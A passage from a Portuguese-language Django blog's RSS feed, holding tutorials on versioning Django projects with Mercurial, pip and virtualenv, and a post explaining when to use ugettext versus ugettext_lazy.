&lt;em&gt;Mercurial&lt;/em&gt; (confira a &lt;a href=&quot;/2011/05/10/como-versionar-projetos-django-mercurial-parte.html&quot;&gt;parte 1&lt;/a&gt; e a &lt;a href=&quot;/2011/05/22/como-versionar-projetos-django-mercurial-parte-2.html&quot; title=&quot;Como versionar projetos Django com o Mercurial - Parte 2&quot;&gt;parte 2&lt;/a&gt;), vamos finalizar com
um exemplo prático de um projeto &lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; usando o &lt;a href=&quot;/tag/mercurial.html&quot; title=&quot;Leia mais sobre Mercurial&quot;&gt;&lt;em&gt;Mercurial&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Começando…&lt;/h2&gt;
&lt;p&gt;Vamos reutilizar a estrutura dos &lt;em&gt;posts&lt;/em&gt; anteriores. Para isso, inicie
um projeto com o &lt;a href=&quot;/tag/virtualenv.html&quot; title=&quot;Leia mais sobre virtualenv&quot;&gt;&lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ cd ~/Projetos/
$ virtualenv DjangoComHG --no-site-packages
$ cd DjangoComHG/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Vamos aproveitar os procedimentos descritos na [parte 2][1] deste
&lt;em&gt;post&lt;/em&gt;. Caso você ainda não tenha criado um repositório no
&lt;a href=&quot;http://www.bitbucket.org/&quot; title=&quot;Versione e compartilhe código com o Mercurial&quot;&gt;&lt;em&gt;Bitbucket&lt;/em&gt;&lt;/a&gt;, essa é uma boa oportunidade.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ hg clone &amp;lt;caminho&amp;gt; django_com_hg&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Não esqueça de mudar o &lt;strong&gt;caminho&lt;/strong&gt; para o &lt;strong&gt;endereço do seu
repositório&lt;/strong&gt;.&lt;/p&gt;
&lt;h2&gt;Instalando o Django&lt;/h2&gt;
&lt;p&gt;Com o &lt;em&gt;virtualenv&lt;/em&gt; ativado, vamos instalar o &lt;em&gt;Django&lt;/em&gt; apenas para o
nosso ambiente &lt;em&gt;virtual&lt;/em&gt; através do &lt;em&gt;pip&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ source bin/activate
$ pip install django&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Só para ter certeza que ele instalou o &lt;em&gt;Django&lt;/em&gt; dentro do nosso ambiente
virtual, vamos abrir o terminal do &lt;a href=&quot;/tag/python.html&quot; title=&quot;Leia mais sobre Python&quot;&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; e digitar as seguintes
instruções:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; django
django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;__path__&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Você deverá obter como resposta uma &lt;em&gt;string&lt;/em&gt; semelhante a esta:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$HOME/Projetos/DjangoComHG/lib/python2.6/site-packages/django/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Iniciando um projeto&lt;/h2&gt;
&lt;p&gt;Vamos fazer uma pequena brincadeira de troca de nomes de pastas, para
que possamos criar o nosso projeto &lt;em&gt;Django&lt;/em&gt; com o mesmo nome do
repositório &lt;em&gt;Mercurial&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ mv post_django_com_hg post_django_com_hg.bk&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Agora mandamos o &lt;code class=&quot;language-text&quot;&gt;django-admin.py&lt;/code&gt; iniciar o projeto:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ django-admin.py startproject post_django_com_hg&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Movemos os arquivos do nosso repositório para dentro de
&lt;code class=&quot;language-text&quot;&gt;post_django_com_hg&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ mv post_django_com_hg.bk/* post_django_com_hg/
$ mv post_django_com_hg.bk/.hg post_django_com_hg/
$ mv post_django_com_hg.bk/.hgignore post_django_com_hg/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Entre no diretório &lt;code class=&quot;language-text&quot;&gt;post_django_com_hg&lt;/code&gt; e dê um &lt;code class=&quot;language-text&quot;&gt;hg status&lt;/code&gt;. Os
arquivos base do &lt;em&gt;Django&lt;/em&gt; não estão no projeto. Vamos adicioná-los,
comitá-los e dar um &lt;code class=&quot;language-text&quot;&gt;push&lt;/code&gt; deles para o repositório &lt;em&gt;Mercurial&lt;/em&gt; no
&lt;em&gt;Bitbucket&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ hg add .
$ hg commit -m &amp;quot;Projeto Django iniciado&amp;quot;
$ hg push&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nos &lt;em&gt;changesets&lt;/em&gt; do repositório, veremos a contribuição enviada:&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 568px;&quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/c95e7c18e4f018ee5ab9d63faa63a129/10e91/changesets-no-bitbucket.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 29.166666666666668%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsSAAALEgHS3X78AAAA0klEQVQY04WQ3W7DIAyF8/4vt7vdtE2TogUCBAj/4EDmSrvYqkr75Jtjyz62h4nQj8/bsm4HQKmvQIUGHWorpVSMCgD1OACj9z4wrh5fq3XOWhv+EkM0Ts/bxezEWR283/ddaU1XIZU+sXm6jZRxypWx4Twxc/4GLWWmcBisoEwp+hCpMMZFlMN4n+8zMcb4dwQfcszBpx+J68SQMw6JrbVhoYIsXGyGCZVSxmNeeN4NtZaMFVxbym0kjEn1dJ6uV875pveYcv8PnIWfCzHnUrH5G5eaWLw77kfRAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;&amp;quot;Changeset no BitBucket&amp;quot;&quot;
        title=&quot;Changeset no BitBucket&quot;
        src=&quot;/static/c95e7c18e4f018ee5ab9d63faa63a129/10e91/changesets-no-bitbucket.png&quot;
        srcset=&quot;/static/c95e7c18e4f018ee5ab9d63faa63a129/8514f/changesets-no-bitbucket.png 192w,
/static/c95e7c18e4f018ee5ab9d63faa63a129/804b2/changesets-no-bitbucket.png 384w,
/static/c95e7c18e4f018ee5ab9d63faa63a129/10e91/changesets-no-bitbucket.png 568w&quot;
        sizes=&quot;(max-width: 568px) 100vw, 568px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;Changeset no BitBucket&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Pronto!&lt;/strong&gt; Basicamente, para termos o &lt;em&gt;Mercurial&lt;/em&gt; versionando um
projeto &lt;em&gt;Django&lt;/em&gt;, são estes os procedimentos… mas eu sei como deixar a
coisa ainda mais interessante&lt;/p&gt;
&lt;h2&gt;Hora de congelar!&lt;/h2&gt;
&lt;p&gt;Digamos que você tenha um colaborador envolvido com o projeto. Quer
dizer que ele vai ter que criar um &lt;em&gt;virtualenv&lt;/em&gt;, clonar o repositório e
instalar as dependências do projeto? A resposta é “sim” – Mas podemos
facilitar esta última parte através do &lt;em&gt;pip&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ pip freeze

Django==1.3
wsgiref==0.1.2&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;O comando &lt;code class=&quot;language-text&quot;&gt;pip freeze&lt;/code&gt; vai coletar os pacotes &lt;em&gt;Python&lt;/em&gt; instalados
(nesse nosso caso, dentro do nosso ambiente virtual através do
&lt;em&gt;virtualenv&lt;/em&gt;) e exibir para a gente em formato de lista. Com isso,
podemos criar um arquivo que armazene as dependências do nosso projeto:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ pip freeze &amp;gt; requirements.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Vamos desativar o ambiente atual, criar um novo e instalar as
dependências listadas nesta arquivo &lt;code class=&quot;language-text&quot;&gt;requirements.txt&lt;/code&gt; neste novo
ambiente:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ deactivate
$ cd ~/Projetos/
$ virtualenv DjangoComHG-2 --no-site-packages
$ source DjangoComHG-2/bin/activate
$ pip install -r DjangoComHG/post_django_com_hg/requirements.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Veja a mágica acontecendo… o &lt;em&gt;pip&lt;/em&gt; instalará todas as dependências
contidas em &lt;code class=&quot;language-text&quot;&gt;requirements.txt&lt;/code&gt; em nosso novo ambiente virtual.&lt;/p&gt;
&lt;p&gt;Podemos resumir os comandos acima em:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ pip install -E DjangoComHG-2 -r DjangoComHG/post_django_com_hg/requirements.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A instrução acima deverá ser escrita em um linha só.&lt;/p&gt;
&lt;h2&gt;Versionando dependências do projeto&lt;/h2&gt;
&lt;p&gt;Logo o &lt;code class=&quot;language-text&quot;&gt;requirements.txt&lt;/code&gt; sendo um arquivo de texto, pode ser
facilmente versionado pelo &lt;em&gt;Mercurial&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ cd ~/Projetos/DjangoComHG/post_django_com_hg
$ hg add requirements.txt
$ hg commit -m &amp;quot;Adicionado arquivo de dependências do pip&amp;quot;
$ hg push&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Finalmente, temos um projeto &lt;em&gt;Django&lt;/em&gt; versionado com &lt;em&gt;Mercurial&lt;/em&gt;,
disponível no &lt;em&gt;Bitbucket&lt;/em&gt;, e com dependências facilmente gerenciáveis
através do &lt;em&gt;pip&lt;/em&gt; em conjunto com o &lt;em&gt;virtualenv&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;E você… utiliza controle de versão com o &lt;em&gt;Django&lt;/em&gt; de uma outra forma?
Conte-nos através dos comentários abaixo.&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Quando usar gettext e gettext_lazy?]]></title><description><![CDATA[Para vocês que desenvolvem em Python e Django preocupando-se
com internacionalização, já devem ter feito a seguinte pergunta: Quando
usar  e ? Acredito que antes de responder esta pergunta, temos que responder outra
questão pertinente: Devo utilizar  ou ? gettext vs ugettext Essas duas funções…]]></description><link>https://klauslaube.com.br/2011/06/01/quando-usar-gettext-gettext_lazy.html</link><guid isPermaLink="false">https://klauslaube.com.br/2011/06/01/quando-usar-gettext-gettext_lazy.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Wed, 01 Jun 2011 09:41:00 GMT</pubDate><content:encoded>&lt;p&gt;Para vocês que desenvolvem em &lt;a href=&quot;/tag/python.html&quot; title=&quot;Leia mais sobre Python&quot;&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; e &lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; preocupando-se
com internacionalização, já devem ter feito a seguinte pergunta: Quando
usar &lt;code class=&quot;language-text&quot;&gt;gettext&lt;/code&gt; e &lt;code class=&quot;language-text&quot;&gt;gettext_lazy&lt;/code&gt;?&lt;/p&gt;
&lt;p&gt;Acredito que antes de responder esta pergunta, temos que responder outra
questão pertinente: Devo utilizar &lt;code class=&quot;language-text&quot;&gt;gettext&lt;/code&gt; ou &lt;code class=&quot;language-text&quot;&gt;ugettext&lt;/code&gt;?&lt;/p&gt;
&lt;h2&gt;gettext vs ugettext&lt;/h2&gt;
&lt;p&gt;Essas duas funções seguem o mesmo princípio dos métodos mágicos
&lt;code class=&quot;language-text&quot;&gt;__str__&lt;/code&gt; e &lt;code class=&quot;language-text&quot;&gt;__unicode__&lt;/code&gt;. Onde &lt;code class=&quot;language-text&quot;&gt;gettext&lt;/code&gt; retornará um texto traduzido
como uma &lt;em&gt;string&lt;/em&gt; “comum”, e &lt;code class=&quot;language-text&quot;&gt;ugettext&lt;/code&gt; retornará um texto traduzido
como uma &lt;em&gt;string&lt;/em&gt; &lt;em&gt;Unicode&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Como nosso idioma nativo abusa do uso de caracteres especiais, aconselho
sempre que possível a utilização do &lt;code class=&quot;language-text&quot;&gt;ugettext&lt;/code&gt;. Na verdade, é uma
forma de garantir sucesso na tradução de qualquer idioma sem quebrar a
cabeça com &lt;em&gt;encoding&lt;/em&gt; (já que o &lt;em&gt;Unicode&lt;/em&gt; tem uma ampla tabela de
caracteres).&lt;/p&gt;
&lt;p&gt;Além disso, passe a mensagem como &lt;em&gt;Unicode&lt;/em&gt; para a função sempre que
necessário:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;texto_traduzido &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ugettext&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;u&apos;Descrição do produto em estoque&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;ugettext vs ugettext_lazy&lt;/h2&gt;
&lt;p&gt;A principal diferença entre &lt;code class=&quot;language-text&quot;&gt;ugettext&lt;/code&gt; e &lt;code class=&quot;language-text&quot;&gt;ugettext_lazy&lt;/code&gt; é que o
último é literalmente um preguiçoso. Ele faz uma referência para a
&lt;em&gt;string&lt;/em&gt; (e não necessariamente para a tradução), fazendo com que a
operação seja executada apenas quando a renderização da &lt;em&gt;string&lt;/em&gt; é
necessária (ao contrário de &lt;code class=&quot;language-text&quot;&gt;ugettext&lt;/code&gt; que é processado assim que a
expressão é interpretada).&lt;/p&gt;
&lt;p&gt;Confuso? Talvez o &lt;a href=&quot;http://www.aprendendodjango.com/o-mesmo-site-em-varios-idiomas/&quot; title=&quot;Aprendendo Django no Planeta Terra - O mesmo site em vários idiomas&quot;&gt;&lt;em&gt;Marinho Brandão&lt;/em&gt;&lt;/a&gt; possa ser mais claro:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A função “&lt;strong&gt;ugettext_lazy()&lt;/strong&gt;“ é &lt;strong&gt;preguiçosa&lt;/strong&gt;. Isso significa que a
tradução é feita somente quando ela é requisitada, o que é&lt;br&gt;
relativamente melhor para o caso de classes de modelo, pois elas&lt;br&gt;
são constantemente utilizadas sem que a tradução de um termo seja&lt;br&gt;
necessário de fato.&lt;/p&gt;
&lt;p&gt;Por outro lado a função “&lt;strong&gt;ugettext()&lt;/strong&gt;“ traduz a string&lt;br&gt;
&lt;strong&gt;instantaneamente&lt;/strong&gt;, o que é melhor para casos como o de formulários&lt;br&gt;
dinâmicos e views, pois eles não são usados de maneira tão constante&lt;br&gt;
quanto classes de modelo.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Então… utilize &lt;code class=&quot;language-text&quot;&gt;ugettext_lazy&lt;/code&gt; nos campos e meta-informações dos
modelos (onde a tradução pode ser feita sob demanda), e &lt;code class=&quot;language-text&quot;&gt;ugettext&lt;/code&gt; em
métodos, funções e views (onde a tradução tem quer ser “instantânea”).&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://docs.python.org/library/gettext.html&quot; title=&quot;gettext - Multilingual internationalization services&quot;&gt;&lt;em&gt;Python Documentation – gettext&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.djangoproject.com/en/dev/topics/i18n/internationalization/#lazy-translation&quot; title=&quot;Django Docs - Lazy Translation&quot;&gt;&lt;em&gt;Django Documentation – Internationalization&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.djangobook.com/en/1.0/chapter18/&quot; title=&quot;The Django Book - i18n&quot;&gt;&lt;em&gt;The Django Book – Internationalization&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.aprendendodjango.com/o-mesmo-site-em-varios-idiomas/&quot; title=&quot;Aprendendo Django - O mesmo site em vários idiomas&quot;&gt;Aprendendo &lt;em&gt;Django&lt;/em&gt; no Planeta Terra – O mesmo &lt;em&gt;site&lt;/em&gt; em vários idiomas&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Como versionar projetos Django com o Mercurial - Parte 2]]></title><description><![CDATA[Dando continuidade ao post Como versionar
projetos Django com o Mercurial, e a série Montando seu ambiente
de desenvolvimento Django no Linux, vamos dar uma pincelada nos
funcionamentos básicos do Mercurial. hg? Mas não era Mercurial? Mercury em português significa mercúrio (nenhuma novidade até…]]></description><link>https://klauslaube.com.br/2011/05/22/como-versionar-projetos-django-mercurial-parte-2.html</link><guid isPermaLink="false">https://klauslaube.com.br/2011/05/22/como-versionar-projetos-django-mercurial-parte-2.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Sun, 22 May 2011 09:04:00 GMT</pubDate><content:encoded>&lt;p&gt;Dando continuidade ao &lt;em&gt;post&lt;/em&gt; &lt;a href=&quot;/2011/05/10/como-versionar-projetos-django-mercurial-parte.html&quot; title=&quot;Leia a primeira parte deste post&quot;&gt;Como versionar
projetos &lt;em&gt;Django&lt;/em&gt; com o &lt;em&gt;Mercurial&lt;/em&gt;&lt;/a&gt;, e a série &lt;a href=&quot;/2011/03/03/montando-seu-ambiente-de-desenvolvimento-django.html&quot; title=&quot;Tá começando com Django? É usuário Linux? Este post pode te interessar&quot;&gt;Montando seu ambiente
de desenvolvimento &lt;em&gt;Django&lt;/em&gt; no &lt;em&gt;Linux&lt;/em&gt;&lt;/a&gt;, vamos dar uma pincelada nos
funcionamentos básicos do &lt;a href=&quot;/tag/mercurial.html&quot; title=&quot;Leia mais sobre Mercurial&quot;&gt;&lt;em&gt;Mercurial&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;hg? Mas não era Mercurial?&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Mercury&lt;/em&gt; em português significa mercúrio (nenhuma novidade até aqui),
que é um elemento químico com o símbolo &lt;code class=&quot;language-text&quot;&gt;Hg&lt;/code&gt; e o número atômico 80
(assim disse a &lt;a href=&quot;http://en.wikipedia.org/wiki/Mercury_(element)&quot; title=&quot;Leia mais sobre o elemento químico Mercúrio&quot;&gt;&lt;em&gt;Wikipedia&lt;/em&gt;&lt;/a&gt; (: ). É devido a isso que você utilizará
o &lt;em&gt;Mercurial&lt;/em&gt; em linha de comando através de comandos iniciados por
&lt;code class=&quot;language-text&quot;&gt;hg&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Antes de iniciarmos, vamos dizer ao &lt;em&gt;Mercurial&lt;/em&gt; quem nós somos. Abra o
arquivo &lt;code class=&quot;language-text&quot;&gt;.hgrc&lt;/code&gt; do seu &lt;code class=&quot;language-text&quot;&gt;home&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ vim ~/.hgrc&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;É fundamental que nossos &lt;em&gt;commits&lt;/em&gt; estejam marcados com nosso nome, e um
e-mail para contato. Vamos escrever estas duas informações neste
arquivo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;ini&quot;&gt;&lt;pre class=&quot;language-ini&quot;&gt;&lt;code class=&quot;language-ini&quot;&gt;&lt;span class=&quot;token selector&quot;&gt;[ui]&lt;/span&gt;
&lt;span class=&quot;token constant&quot;&gt;username&lt;/span&gt; &lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt; seu nome &amp;lt; seuemail@provedor.com &gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Salve o arquivo, e estamos prontos para iniciar.&lt;/p&gt;
&lt;h2&gt;Primeiros passos&lt;/h2&gt;
&lt;p&gt;Os passos que vou exemplificar aqui não são muito diferentes dos que
você encontrará na &lt;a href=&quot;http://mercurial.selenic.com/&quot; title=&quot;Visite a página oficial do projeto Mercurial&quot;&gt;página oficial do &lt;em&gt;Mercurial&lt;/em&gt;&lt;/a&gt;. Preguiça minha?
Talvez… mas você verá que usar o &lt;em&gt;Mercurial&lt;/em&gt; é extremamente simples! As
dificuldades são as exceções do dia a dia.&lt;/p&gt;
&lt;p&gt;Para deixar o exemplo mais interessante, vamos utilizar o &lt;em&gt;virtualenv&lt;/em&gt;.
Dúvidas? Confira o &lt;em&gt;post&lt;/em&gt; &lt;a href=&quot;/2011/03/18/python-django-virtualenv.html&quot; title=&quot;Construa projetos isolados do seu sistema com virtualenv&quot;&gt;&lt;em&gt;Python&lt;/em&gt;, &lt;em&gt;Django&lt;/em&gt; e &lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt; e
visualize aonde pretendemos chegar:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ cd ˜/Projetos/
$ virtualenv DjangoComHG --no-site-packages

$ cd DjangoComHG&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Agora sim, vamos criar um projeto através da seguinte expressão:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ hg init django-com-hg&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Projeto criado… vamos partir para as tarefas mais comuns no &lt;em&gt;Mercurial&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Altere, adicione e “comite”&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Mercurial&lt;/em&gt; é &lt;a href=&quot;http://en.wikipedia.org/wiki/Distributed_revision_control&quot; title=&quot;Leia mais sobre Distributed Version Control System&quot;&gt;&lt;em&gt;DVCS&lt;/em&gt;&lt;/a&gt;, isto quer dizer que, quando você clonar um
repositório remoto você terá uma cópia exata dele em seu computador.
Logo, as alterações que você “persistir” estarão disponíveis apenas na
sua cópia local. Pode parecer um pouco confuso, mas com o tempo faz todo
o sentido.&lt;/p&gt;
&lt;p&gt;Para o primeiro &lt;em&gt;commit&lt;/em&gt; (persistir nossas alterações localmente)
escreva um arquivo &lt;code class=&quot;language-text&quot;&gt;.hgignore&lt;/code&gt; (&lt;a href=&quot;http://mercurial.selenic.com/wiki/.hgignore&quot; title=&quot;Entenda para que serve o arquivo .hgignore&quot;&gt;saiba mais do que se trata&lt;/a&gt;) e um
arquivo &lt;code class=&quot;language-text&quot;&gt;README&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ cd django-com-hg/
$ ls -a

.hg     .hgignore     README&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A pasta &lt;code class=&quot;language-text&quot;&gt;.hg&lt;/code&gt; na verdade é quem vai identificar e armazenar todas as
informações do nosso projeto. Sem ela, você deixa de ter o controle
sobre as versões dos arquivos e subpastas do projeto.&lt;/p&gt;
&lt;p&gt;Execute o comando &lt;code class=&quot;language-text&quot;&gt;hg status&lt;/code&gt; e veja o que aparece… acredito que o
resultado seja auto-sugestivo. O &lt;em&gt;Mercurial&lt;/em&gt; ainda não sabe o que fazer
com os arquivos no projeto, portanto diremos a ele que queremos
versionar estes arquivos:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ hg add .hgignore README&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Uma nova execução do &lt;code class=&quot;language-text&quot;&gt;hg status&lt;/code&gt; vai apontar que os arquivos foram
marcados para adição, porém, ainda não foram adicionados. Você vai
confirmar está operação através do comando &lt;code class=&quot;language-text&quot;&gt;commit&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ hg commit -m &amp;quot;Primeiro commit com .hgignore&amp;quot;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;O parâmetro &lt;code class=&quot;language-text&quot;&gt;-m&lt;/code&gt; serve para passarmos uma mensagem de descrição do
&lt;code class=&quot;language-text&quot;&gt;commit&lt;/code&gt; que estamos fazendo. Isto facilita na leitura do &lt;em&gt;log&lt;/em&gt; de
&lt;em&gt;commits&lt;/em&gt; realizados:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ hg log&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Estes serão os comandos que provavelmente você usará constantemente
enquanto desenvolve.&lt;/p&gt;
&lt;h2&gt;Compartilhando as suas produções&lt;/h2&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 180px;&quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/ce36d314697154285d961d7076a96e53/e9ff0/bitbucket-logo.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
